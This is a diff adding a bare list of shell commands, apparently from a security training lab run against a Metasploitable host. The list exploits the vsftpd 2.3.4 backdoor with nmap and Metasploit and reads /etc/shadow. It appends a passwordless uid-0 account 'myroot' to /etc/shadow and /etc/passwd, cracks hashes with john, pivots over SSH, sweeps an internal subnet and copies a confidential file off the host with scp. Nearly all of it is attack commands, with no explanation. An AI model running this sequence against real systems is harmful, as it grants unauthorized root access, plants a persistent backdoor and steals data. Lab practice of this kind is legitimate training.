@@ -1,0 +1,60 @@
+[analyst@secOps~]$ sudo ./lab.support.files/scripts/configure_as_static.sh
+
+analyst@SecOnion:~/Desktop$ sudo service nsm status
+
+analyst@SecOnion:~/Desktop$ date
+
+root@kali:~# nmap --script ftp-vsftpd-backdoor 209.165.200.235 –-reason > ftpd.txt
+root@kali:~# cat ftpd.txt
+root@kali:~# msfconsole
+msf > search vsftpd
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(vsftpd_234_backdoor) > set rhost 209.165.200.235
+rhost => 209.165.200.235
+msf exploit(vsftpd_234_backdoor) > show options
+msf exploit(vsftpd_234_backdoor) > exploit
+
+whoami
+hostname
+ifconfig
+cat /etc/shadow
+
+root@kali:~# nano /root/shadow.txt
+root@kali@~# cat /root/shadow.txt | grep root
+
+echo "myroot::14747:0:99999:7:::" >> /etc/shadow
+
+cat /etc/shadow
+
+cat /etc/passwd | grep root
+
+echo "myroot:x:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+cat /etc/passwd
+
+msf exploit(vsftpd_234_backdoor) >
+
+root@kali:~# john --show /root/shadow.txt 
+root@kali:~# ssh analyst@209.165.200.235
+
+analyst@209.165.200.235's password: 
+analyst@metasploitable:~$ su -l myroot
+root@metasploitable:~#
+root@metasploitable:~# cat /etc/shadow
+analyst@metasploitable:~$ cat /etc/shadow
+analyst@metasploitable:~$ ifconfig
+analyst@metasploitable:~$ ip route
+analyst@metasploitable:~$ ssh analyst@209.165.200.226
+
+analyst@SecOnion:~$ ifconfig
+analyst@SecOnion:~$ for ((i=1;i<15;i+=1)); do ping -c 2 192.168.0.$i; done
+analyst@SecOnion:~$ ssh 192.168.0.11
+[analyst@secOps ~]$ cd lab.support.files
+[analyst@secOps lab.support.files]$ ftp 209.165.200.235
+ftp>
+ftp> put confidential.txt 
+analyst@secOps lab.support.files]$ zip -e confidential.zip confidential.txt
+[analyst@secOps lab.support.files]$ rm confidential.txt
+root@kali:~# scp analyst@209.165.200.235:/home/analyst/confidential.txt ~
+root@kali:~# ssh analyst@209.165.200.235
+analyst@metasploitable:~$ rm confidential.txt
